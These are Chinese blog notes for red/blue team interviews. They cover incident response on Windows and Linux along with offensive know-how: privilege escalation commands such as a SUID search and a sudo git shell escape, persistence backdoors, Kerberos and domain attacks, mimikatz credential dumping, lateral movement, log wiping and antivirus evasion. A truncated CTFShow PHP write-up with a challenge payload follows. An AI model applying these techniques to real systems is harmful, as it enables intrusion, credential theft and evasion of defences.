title="正在被入侵"></a>正在被入侵</h3><p>可能入侵者在尝试进行攻击的时候，下线，然后对机器进行排查</p><p>比如：弱口令爆破</p><p>1.弱口令爆破会产生日志，日志一定要采用远程日志系统，例如Linux的rsyslog。开启远程日志系统的好处：不怕日志被攻击者删除</p><p>\2. 一定要找到入侵者的源IP，在防火墙下发阻断策略</p><h2 id="windows入侵排查"><a href="#windows入侵排查" class="headerlink" title="windows入侵排查"></a>windows入侵排查</h2><ol><li><p>检查系统账号安全</p></li><li><p>历史命令</p></li><li><p>检查异常端口、进程</p></li><li><p>检查启动项、计划任务、服务</p></li><li><p>日志分析</p></li><li><ol><li>日志中搜索关键字:如:union,select等</li><li>分析状态码:</li></ol></li><li><ol><li><ol><li>- 1xxinformation</li><li>- 200successful</li></ol></li></ol></li><li><ol><li><ol><li>- 300redirection</li><li>- 4xxclient error</li></ol></li></ol></li><li><ol><li><ol><li>- 5xxserver error</li></ol></li></ol></li><li><p>查找可疑文件</p></li></ol><h2 id="Windows常见命令"><a href="#Windows常见命令" class="headerlink" title="Windows常见命令"></a>Windows常见命令</h2><p>1、Regedit 查看策略表</p><p>2、Msconfig 查看系统配置</p><p>3、Taskmgr  启动任务管理器</p><p>4、Eventvwr,msc 打开日志的命令</p><p>5、Gpedit.msc  打开本地组策略</p><p>6、Compmgmt.msc 计算机管理</p><p>7、Lusrmgr.msc  打开用户与组</p><p>8、Taskschd  打开计划任务</p><p>9、Net user xxx &#x2F;add 添加用户</p><p>10、Net localgroup administrators xxxx &#x2F;add 把某用户放到管理员组里面</p><p>11、Net session 查询当前会话</p><p>12、Net start 查看当前运行的服务</p><p>13、Net use 查看当前共享连接</p><p>15、Net share xxx &#x2F;del 删除共享的链接</p><p>16、查看隐藏用户可以去，用户管理</p><p>17、Findstr &#x2F;s &#x2F;I “hellow” ** 18查询包含hellow 的关键字</p><h2 id="被上传一句话、日志被清除、-已经免杀"><a href="#被上传一句话、日志被清除、-已经免杀" class="headerlink" title="被上传一句话、日志被清除、 已经免杀"></a>被上传一句话、日志被清除、 已经免杀</h2><p>一般都有备份文件，可以提取一下备份文件的md5值，再把现在的md5值提取出来对比一下，因为文件发生改变 md5就会改变  通过软件（文件对比器）对比一下，看看有没有不同的地方  初步缩写范围 基本就可以确认恶意文件</p><h3 id="没有备份文件的情况下"><a href="#没有备份文件的情况下" class="headerlink" title="没有备份文件的情况下"></a>没有备份文件的情况下</h3><p>webshell有执行权限，至少有一个命令函数  全部搜集出来 对全文件内容进行搜索排查</p><h2 id="Windows-系统日志"><a href="#Windows-系统日志" class="headerlink" title="Windows 系统日志"></a>Windows 系统日志</h2><p>C:\Windows\System32\winevt\Logs\system.evtx</p><h2 id="Windows系统安全日志"><a href="#Windows系统安全日志" class="headerlink" title="Windows系统安全日志"></a>Windows系统安全日志</h2><p>C:\Windows\System32\winevt\Logs\ Security.evtx</p><h2 id="windows加固方法"><a href="#windows加固方法" class="headerlink" title="windows加固方法"></a>windows加固方法</h2><p>Windows加固：修改弱口令，对各个服务密码排查，然后对服务配置文件进行更改禁用php函数实行黑名单白名单</p><p>对服务版本进行排查查找当前版本是否存在Nday</p><p>iptable设置用户相关服务端口</p><p>安装杀毒软件</p><hr><h1 id="linux部分"><a href="#linux部分" class="headerlink" title="linux部分"></a>linux部分</h1><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>\1.  uid提权 (find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null)</p><p>2.（sudo git help config !&#x2F;bin&#x2F;bash或者！’sh’完成提权）</p><p>3、脏牛提权</p><p>4、内核提权</p><p>5、环境劫持</p><p>6、suid提权</p><p>7、cve-2021-4034</p><p>8、docker提权</p><h2 id="入侵排查思路-1"><a href="#入侵排查思路-1" class="headerlink" title="入侵排查思路;"></a>入侵排查思路;</h2><p>1、账号安全</p><p>2、历史命令</p><p>3、检查异常端口</p><p>4、检查异常进程</p><p>5、检查开机启动项</p><p>6、检查定时任务</p><p>7、检查服务</p><p>8、检查异常文件</p><p>9、检查系统日志</p><h2 id="形容passwd和shadow区别"><a href="#形容passwd和shadow区别" class="headerlink" title="形容passwd和shadow区别"></a>形容passwd和shadow区别</h2><p><code>/etc/passwd</code> 存账户信息一般不存密码  </p><p><code>/etc/shadow</code> 主要用来存密码</p><p><code>/etc/passwd</code> 默认是任意用户可读只有root用户可修改  &#x2F;etc&#x2F;shadow 默认只有root用户可读可写</p><p><code>/etc/passwd</code> 包含系统用户和用户的主要信息</p><p><code>/etc/shadow</code> 用于储存系统中用户的密码，又称为影子文件</p><p><code>/etc/group</code> 记录组ID和组名的对应文件</p><h2 id="系统日志分析"><a href="#系统日志分析" class="headerlink" title="系统日志分析"></a>系统日志分析</h2><p>常见的应急响应事件分类：</p><p>web入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p><h2 id="中挖矿病毒怎么分析解决"><a href="#中挖矿病毒怎么分析解决" class="headerlink" title="中挖矿病毒怎么分析解决"></a>中挖矿病毒怎么分析解决</h2><p>ps -aux查看进程分析</p><p>top分析算力情况，算力特别多的一般是挖矿病毒</p><p>对流量进行过滤含有矿池服务器的的流量包就是挖矿病毒</p><p>以及任务计划可以排查出挖矿病毒，然后kill掉进程，rm掉程序</p><h2 id="中挖矿怎么办？删不掉呢"><a href="#中挖矿怎么办？删不掉呢" class="headerlink" title="中挖矿怎么办？删不掉呢"></a>中挖矿怎么办？删不掉呢</h2><p>如果情况允许，先下线，并检查挖矿是否有在内网传播，及时下线所有被传播的主机，上机排查攻击痕迹、一般可以从cup占用、可疑进程、开放端口、计划任务、服务项等几个方面进行排查，然后将样本上传到在线分析平台，然后清除挖矿主程序，主要就是双向封禁矿池地址、删除计划任务自启动、删服务，结束恶意进程、删病毒</p><p>1、删不掉的情况，我们先确认下是因为程序正在使用，还是权限不够，根据情况来进行相应措施</p><p>2、直接降权，降到没有执行权限</p><h2 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h2><p>配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/rsyslog.conf</span><br><span class="line">/etc/rsyslog.d/*</span><br></pre></td></tr></table></figure><h2 id="查看帐号文件"><a href="#查看帐号文件" class="headerlink" title="查看帐号文件"></a>查看帐号文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="查看历史命令记录文件和命令"><a href="#查看历史命令记录文件和命令" class="headerlink" title="查看历史命令记录文件和命令"></a>查看历史命令记录文件和命令</h2><p><code>history</code>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.history</span><br></pre></td></tr></table></figure><p><code>history</code>    &#x2F;&#x2F;显示终端执行过的命令</p><p><code>history 10</code>  &#x2F;&#x2F;显示最近10条终端执行过的命令</p><p><code>Ctrl+r</code>     &#x2F;&#x2F;搜索已经执行过的命令</p><h2 id="ssh被爆破的应急解决"><a href="#ssh被爆破的应急解决" class="headerlink" title="ssh被爆破的应急解决"></a>ssh被爆破的应急解决</h2><p>首先日志分析 想到的是<code>/var/log/secure</code>，</p><p>查看登录相关安全日志：<code>tail -f /var/log/secure</code></p><p> 这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><p>统计一下登录成功的IP有哪些，看登陆成功的IP是否都是正常用户的，如不是，立刻下线，并检查这台服务器是否有对其他内网服务器进行攻击，对服务器进行检测，是否有添加用户或后门等</p><p>日志分析–》查看用户安全性–》确定攻击情况–》关闭22端口</p><h2 id="SSH加固"><a href="#SSH加固" class="headerlink" title="SSH加固"></a>SSH加固</h2><p>1、禁止向公网开放端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）</p><p>2、更改服务器ssh默认端口</p><p>3、部署入侵检测设备，增强安全防护</p><p>4、同一个ip登录超过5次错误实行黑名单</p><p>5、禁用root登录</p><p>6、禁用空密码</p><p>7、改用密钥登录</p><p>8、基于受信任主机的无密码登录</p><h2 id="查看网站日志"><a href="#查看网站日志" class="headerlink" title="查看网站日志"></a>查看网站日志</h2><p>​先进入日志文件所在目录（<code>/var/log</code>），然后使用 <code>tail -f </code>日志文件<code>.log</code> 命令进行查看（查看的命令有：<code>cat</code>（查看全部）、<code>tail</code>（查看最后多少行）、<code>head</code>（查看最开始多少）、<code>more</code>，配合<code>grep</code>使用）</p><h2 id="查看cpu占用率"><a href="#查看cpu占用率" class="headerlink" title="查看cpu占用率"></a>查看cpu占用率</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top`，简化版`top -bn 1 -i -c</span><br></pre></td></tr></table></figure><h2 id="查看ssh登陆日志"><a href="#查看ssh登陆日志" class="headerlink" title="查看ssh登陆日志"></a>查看ssh登陆日志</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastlog` 会列出所有用户最近登陆的信息（引用的是`/var/log/lastlog`文件中的信息），只看`ssh`的话就`cat /var/log/lastlog</span><br></pre></td></tr></table></figure><h2 id="查看是否有其他ssh登陆在线"><a href="#查看是否有其他ssh登陆在线" class="headerlink" title="查看是否有其他ssh登陆在线"></a>查看是否有其他ssh登陆在线</h2><p>通过<code>who</code>命令检查当前在线用户</p><p>在<code>/var/log/secure</code>可以看到登陆的情况在<code>/var/log/btmp</code>中可以查看到登陆失败的记录（可通过<code>lastb</code>命令进行检查）在<code>/var/log/lastlog</code>中可以查看最近登陆的记录 （可通过<code>last</code>命令进行检查）</p><p>如果在<code>ssh</code>的配置文件里（一般在<code>/etc/ssh/sshd_config</code>）和<code>syslog</code>配置文件中对日志文件做过定制的话那么需要根据具体情况定位日志文件</p><h2 id="查看中间件的日志"><a href="#查看中间件的日志" class="headerlink" title="查看中间件的日志"></a>查看中间件的日志</h2><p>进入<code>/var/log</code>下然后进入要查看的中间件日志目录进行查看</p><h2 id="分析命令被替换"><a href="#分析命令被替换" class="headerlink" title="分析命令被替换"></a>分析命令被替换</h2><p>对<code>linux</code>几个指令集进行<code>md5sum</code>定期验证，<code>md5sum</code>如果变了那说明指令变了，然后对指令集进行还原</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>1.<code>Crontab</code>定时任务 使用<code>corntab</code>定时触发恶意脚本</p><p>\2. <code>ssh</code>后门  进程注入<code>hook</code>密码校验函数 得到管理员密码</p><p>\3. 修改管理员二进制 文件 创建软连接 使管理员在输入 <code>ls</code> 或者<code>cd</code>这种命令的时候执行我们的恶意脚本</p><p>\4. 环境变量劫持</p><p>\5. 内核后门(难度较高，需要重新编译内核并重启。优点，隐蔽性极强)</p><p>\6. <code>pam</code>后门</p><p>\7. <code>/init.d/</code>系统启动时默认运行的脚本</p><p>\8. <code>ssh</code>后门</p><h2 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h2><p><code>/etc/redhat-release</code>  Centos 版本号</p><p><code>/proc/cpuinfo</code>   CPU型号信息</p><p><code>/var/log/message</code>  内核日志</p><p><code>/var/log/last</code>   登录日志</p><p><code>/etc/sysconfig/selinux</code> selinux状态</p><p><code>/etc/passwd</code>  用户账户信息</p><p><code>/etc/shadow</code> 用户密码</p><h1 id="各种排查"><a href="#各种排查" class="headerlink" title="各种排查"></a>各种排查</h1><h2 id="网络攻击的生命周期？"><a href="#网络攻击的生命周期？" class="headerlink" title="网络攻击的生命周期？"></a>网络攻击的生命周期？</h2><p>勘查-武装化-传送-利用-安装-指挥与控制-执行目标</p><h2 id="应急响应的六个过程？"><a href="#应急响应的六个过程？" class="headerlink" title="应急响应的六个过程？"></a>应急响应的六个过程？</h2><p>准备-检测-抑制-根除-恢复-跟踪总结</p><h2 id="中了内存马如何排查-（不死马）"><a href="#中了内存马如何排查-（不死马）" class="headerlink" title="中了内存马如何排查 （不死马）"></a>中了内存马如何排查 （不死马）</h2><h3 id="源码检测"><a href="#源码检测" class="headerlink" title="源码检测"></a>源码检测</h3><p>java中，只有被JVM加载后的类才能被调用，或者在需要时通过反射通知JVM加载。所以特征都在内存中，表现形式为被加载的class，可以通过一些工具或方法获取到JVM的运行时内存中已加载的类， Java本身提供了Instrumentation类来实现运行时注入代码并执行，所以我么可以筛选条件组合进行检测：</p><p>①新增的或修改的；<br>②没有对应class文件的<br>③xml配置中没注册的<br>④冰蝎等常见工具使用的<br>⑤filterchain中排第一的filter类</p><p>还有一些比较弱的特征可以用来辅助检测，比如类名称中包含shell或者为随机名，使用不常见的classloader加载的类</p><p>另外，有一些工具可以辅助检测内存马，如<a href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a>是通过jsp扫描应用中所有的filter和servlet，然后通过名称、对应的class是否存在来判断是否是内存马</p><h3 id="内存马排查"><a href="#内存马排查" class="headerlink" title="内存马排查"></a>内存马排查</h3><p>如果是jsp注入，日志中排查可疑jsp的访问请求。</p><p>如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</p><p>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p><p>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间</p><p>如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</p><h3 id="查杀"><a href="#查杀" class="headerlink" title="查杀"></a>查杀</h3><p>通过上面确定内存马后，进入内存进行查杀，或者使用一些专杀工具来杀</p><h2 id="日志中看到的行为分析"><a href="#日志中看到的行为分析" class="headerlink" title="日志中看到的行为分析"></a>日志中看到的行为分析</h2><p>分析方法：</p><p>蚁剑 菜刀  </p><p>post一个PHP的函数  这些函数可以对文件进行操作  可以对数据库进行操作  </p><p>如果特征编码 例如base64 rot13 通过该种编码的解码来实现流量的解密</p><p>冰蝎</p><p>aes-128加密</p><p>在开始连接进行密钥协商的时候 抓取冰蝎流量密钥值</p><p>通过冰蝎密钥 对加密的流量进行解密在进行行为分析</p><h2 id="寻找webshell"><a href="#寻找webshell" class="headerlink" title="寻找webshell"></a>寻找webshell</h2><p>1.自动化查找  D盾 河马  fotify  </p><p>\2. 手动查找  windows  sublime  全文件夹查找 IDE PHPSTORM 全局查找</p><p>   Linux  命令查找  <code>grep -rn &quot;eval(&quot; *</code></p><p>   webshell特征 PHP的危险函数</p><p>   还有<code>phar &lt;?php XXXXX</code></p><h2 id="burp中intruder的Positions模块四个选项的意思"><a href="#burp中intruder的Positions模块四个选项的意思" class="headerlink" title="burp中intruder的Positions模块四个选项的意思"></a>burp中intruder的Positions模块四个选项的意思</h2><p>arget设置攻击目标、positions设置爆破参数和爆破方式、payload设置参数要用的字典、options设置爆破次数、每次时间间隔</p><hr><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="针对kerbores的攻击有哪些"><a href="#针对kerbores的攻击有哪些" class="headerlink" title="针对kerbores的攻击有哪些"></a>针对kerbores的攻击有哪些</h2><ol><li><p>用户名爆破</p></li><li><p>密码喷洒和密码爆破</p></li><li><p>Kerberoasting</p></li><li><p>ASRepRoasting</p></li><li><p>黄金票据和白银票据</p></li><li><p>MS14-068</p></li><li><p>非约束委派、约束委派、基于资源的约束委派</p></li><li><p>票据传递（ptt&#x2F;ptk&#x2F;ptc）</p></li><li><p>mimikatz加密降级攻击(万能钥匙)</p></li><li><p>使用恶意的kerberos证书做权限维持</p></li></ol><h2 id="KDC服务默认开放哪些端口"><a href="#KDC服务默认开放哪些端口" class="headerlink" title="KDC服务默认开放哪些端口"></a>KDC服务默认开放哪些端口</h2><p><code>88</code>kerberos krb5、<code>464</code>kerberos kpasswd（v5）</p><h2 id="桌面有管理员会话，想要做会话劫持怎么做"><a href="#桌面有管理员会话，想要做会话劫持怎么做" class="headerlink" title="桌面有管理员会话，想要做会话劫持怎么做"></a>桌面有管理员会话，想要做会话劫持怎么做</h2><p>提权到system权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。</p><p>终端服务会话可以是连接状态也可以是未连接状态</p><h2 id="域内攻击方法有了解过吗"><a href="#域内攻击方法有了解过吗" class="headerlink" title="域内攻击方法有了解过吗"></a>域内攻击方法有了解过吗</h2><p>MS14-068、Roasting攻击离线爆破密码、非约束性委派、基于资源的约束委派、ntlm relay、CVE-2021-42287&#x2F;CVE-2021-42278</p><h2 id="抓取密码的话会怎么抓"><a href="#抓取密码的话会怎么抓" class="headerlink" title="抓取密码的话会怎么抓"></a>抓取密码的话会怎么抓</h2><p><code>procdump</code>+<code>mimikatz </code>转储然后用<code>mimikatz</code>离线读取</p><p><code>Sam</code>获取然后离线读取</p><h2 id="什么版本之后抓不到密码"><a href="#什么版本之后抓不到密码" class="headerlink" title="什么版本之后抓不到密码"></a>什么版本之后抓不到密码</h2><p>windows server 2012之后，或者打了补丁</p><h3 id="抓不到的话怎么办"><a href="#抓不到的话怎么办" class="headerlink" title="抓不到的话怎么办"></a>抓不到的话怎么办</h3><p>翻阅文件查找运维等等是否记录密码。或者hash传递、或者获取浏览器的账号密码</p><h2 id="psexec和wmic的区别"><a href="#psexec和wmic的区别" class="headerlink" title="psexec和wmic的区别"></a>psexec和wmic的区别</h2><p><code>psexec</code>会记录大量日志，<code>wmic</code>不会记录日志并且更为隐蔽</p><h2 id="横向渗透命令执行手段"><a href="#横向渗透命令执行手段" class="headerlink" title="横向渗透命令执行手段"></a>横向渗透命令执行手段</h2><p>psexec，wmic，smbexec，winrm，net use共享+计划任务+type命令</p><h2 id="内网的白名单-如何突破？"><a href="#内网的白名单-如何突破？" class="headerlink" title="内网的白名单 如何突破？"></a>内网的白名单 如何突破？</h2><p>利用已在白名单中的软件执行目标代码，甚至发动无文件攻击</p><p>白名单污染</p><p>暴力破解白名单防护软件</p><h2 id="内网135端口具体有哪些利用方式？"><a href="#内网135端口具体有哪些利用方式？" class="headerlink" title="内网135端口具体有哪些利用方式？"></a>内网135端口具体有哪些利用方式？</h2><p>爆破用户、<code>wmic</code>执行命令进行横向</p><h2 id="内网横向具体需要收集哪些密码？"><a href="#内网横向具体需要收集哪些密码？" class="headerlink" title="内网横向具体需要收集哪些密码？"></a>内网横向具体需要收集哪些密码？</h2><p>一般是登陆过的用户密码，还有数据库密码、各种密码最好都收集一下</p><h2 id="内网的横向扩展具体有哪些方法？"><a href="#内网的横向扩展具体有哪些方法？" class="headerlink" title="内网的横向扩展具体有哪些方法？"></a>内网的横向扩展具体有哪些方法？</h2><p>密码喷洒、IPC$、WMI、mimikatz、PTH、MS14-068、web漏洞、系统漏洞</p><h2 id="内网渗透的隧道具体有什么工具？"><a href="#内网渗透的隧道具体有什么工具？" class="headerlink" title="内网渗透的隧道具体有什么工具？"></a>内网渗透的隧道具体有什么工具？</h2><p>frp、ew、ssh、Neo-reGeorg、netsh、Lcx</p><h2 id="拿到shell之后如何接管域控"><a href="#拿到shell之后如何接管域控" class="headerlink" title="拿到shell之后如何接管域控"></a>拿到shell之后如何接管域控</h2><p>如果拿到的就是域内用户，定位一下域控，提取本机<code>hash</code>看域管是否登陆过本机，是否有域用户的进程之类的注入域用户进程窃取下权限，然后使用一些域内漏洞来提权到域管从而接管域控，然后通过<code>dcsync</code>权限维持或者<code>adminsdhound</code>权限维持，也可以修改机器账号的<code>useraccount</code>位 8192权限维持</p><h2 id="端口转发和端口映射"><a href="#端口转发和端口映射" class="headerlink" title="端口转发和端口映射"></a>端口转发和端口映射</h2><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><ul><li><p>正向代理，当客户端无法访问外部资源的时候（比如Google、YouTube），可以通过一个正向代理去间接地访问。</p></li><li><ul><li>正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。</li></ul></li><li><p>反向代理，客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。此时代理服务器对外就表现为一个服务器</p></li></ul><h2 id="正向和反向shell"><a href="#正向和反向shell" class="headerlink" title="正向和反向shell"></a>正向和反向shell</h2><p>正向Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况</p><p>反向Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况</p><h2 id="内网环境不出网？"><a href="#内网环境不出网？" class="headerlink" title="内网环境不出网？"></a>内网环境不出网？</h2><p>1.通过webshell实现内网socket代理</p><p>2.正向链接</p><p>3.ssh隧道</p><p>4.协议不同出网的方式不同，如dns对应dnscat2  tcp对应</p><p>5.测试是否是特定协议或端口出网</p><h2 id="域管定位"><a href="#域管定位" class="headerlink" title="域管定位"></a>域管定位</h2><p><code>net group &quot;Domain Admins&quot; /domain</code> &#x2F;&#x2F;查询域管理员</p><p>此外还可以通过一些工具定位：PSloggedon.exe、PVefindaduser.exe、powerView.ps1</p><h2 id="域控定位"><a href="#域控定位" class="headerlink" title="域控定位"></a>域控定位</h2><p>cmd定位：<code>net group &quot;Domain controllers&quot; /Domain</code>            &#x2F;&#x2F;查询域控</p><p><code>net time /domain</code>&#x2F;&#x2F;方式来定位域控，显示域控时间</p><p>DNS解析记录定位：<code>nslookup -type=all _ldap._tcp.dc._msdcs.tubai.com</code> &#x2F;&#x2F;若当前主机dns为域内dns，则可以通过解析记录定位</p><p>端口探测定位：扫描内网中同时开放<code>389</code>、<code>636</code>与<code>53</code>的机器，<code>389</code>默认是<code>LDAP</code>协议端口，<code>636</code>端口是<code>LDAPS</code>，<code>53</code>端口默认是DNS端口，主要用于域名解析，通过DNS服务器可以实现域名与ip地址之间转换，他们都是域控机器开放的端口</p><p>SPN扫描定位：由于<code>SPN</code>本身就是正常的<code>kerberos</code>请求，所以扫描隐蔽，它不同于<code>TCP</code>与<code>UDP</code>常规端口扫描。大部分windows已经自带<code>setspn.exe</code>，且此操作无需管理权限</p><p>命令：<code>setspn -T tubai.com -Q /</code></p><p>扫描结果中根据：<code>CN=AD-SERVER,OU=Domain Controllers,DC=tubai,DC=com</code>来进行域控的定位</p><h2 id="mimikatz是从哪个进程抓hash"><a href="#mimikatz是从哪个进程抓hash" class="headerlink" title="mimikatz是从哪个进程抓hash?"></a>mimikatz是从哪个进程抓hash?</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsass.exe</span><br></pre></td></tr></table></figure><h2 id="2012-无法破解hash-怎么上桌面"><a href="#2012-无法破解hash-怎么上桌面" class="headerlink" title="2012 无法破解hash 怎么上桌面"></a>2012 无法破解hash 怎么上桌面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash pth传递</span><br></pre></td></tr></table></figure><h2 id="如何获取内网中机器数量"><a href="#如何获取内网中机器数量" class="headerlink" title="如何获取内网中机器数量"></a>如何获取内网中机器数量</h2><p>可以使用命令<code>net user /domian</code></p><p>使用扫描器扫一下</p><h2 id="金票和银票的区别"><a href="#金票和银票的区别" class="headerlink" title="金票和银票的区别"></a>金票和银票的区别</h2><p>获取的权限不同</p><p>认证流程不同</p><p>加密方式不同</p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>黄金票据的条件要求：</p><p>1.域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot]</p><p>2.域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value]（就是域成员SID值去掉最后的）</p><p>3.目标服务器的 FQDN</p><p>4.可利用的服务</p><p>5.域的KRBTGT账户NTLM密码哈希</p><p>6.需要伪造的用户名</p><p>一旦攻击者拥有管理员访问域控制器的权限，就可以使用Mimikatz来提取KRBTGT帐户密码哈希值</p><h2 id="横向连接方式"><a href="#横向连接方式" class="headerlink" title="横向连接方式"></a>横向连接方式</h2><p>$IPC、Psexec、WMI、Schtasks、AT、SC、WINRM</p><h2 id="域渗透过程"><a href="#域渗透过程" class="headerlink" title="域渗透过程"></a>域渗透过程</h2><p>拿到跳板后，先探测一波内网存活主机，用net user &#x2F;domian命令查看跳板机是否在域内，探测存活主机、提权、提取hash、进行横向移动，定位dc位置，查看是否有能直接提权域管的漏洞，拿到dc控制权后进行提权，然后制作黄金票据做好维权，清理一路过来的日志擦擦脚印</p><hr><h1 id="木马免杀"><a href="#木马免杀" class="headerlink" title="木马免杀"></a>木马免杀</h1><p>其实简单的免杀还是挺简单的，可以先fuzz定位出被查杀的语句，然后对被查杀那部分进行一波操作，像是加密啊、编码啊、动态执行啊什么的，或者拆分拼接啊，特定条件执行啊，方法很多，主要就是找到那里被杀了，然后对被杀的部分进行处理</p><h2 id="shellcode免杀？"><a href="#shellcode免杀？" class="headerlink" title="shellcode免杀？"></a>shellcode免杀？</h2><p>1.编码</p><p>2.加壳 </p><p>3.混淆 </p><p>4.分离免杀</p><p>5.特征码修改</p><p>6.添加无用逻辑语句</p><p>7.重写api</p><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><p>分为加载器和shellcode两部分，一般将shellcode存储在网页或者图片中，然后加载器远程加载存在shellcode的网页或者图片之类的</p><h2 id="powershell远程加载？"><a href="#powershell远程加载？" class="headerlink" title="powershell远程加载？"></a>powershell远程加载？</h2><p>可以远程加载mimikazt，远控文件，exe可执行文件实现无文件落地。</p>]]></content>
      
      
      <categories>
          
          <category> hvv </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hvv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow_PHP特性</title>
      <link href="/2022/06/18/CTFshow_PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2022/06/18/CTFshow_PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h1><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="web89："><a href="#web89：" class="headerlink" title="web89："></a>web89：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错</p><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>先让第一个if不相等执行下一个语句，判断有无num，第二个if正则匹配[0-9]，第三个if如果等于1的话，执行if里边的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure><h3 id="web90："><a href="#web90：" class="headerlink" title="web90："></a>web90：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span 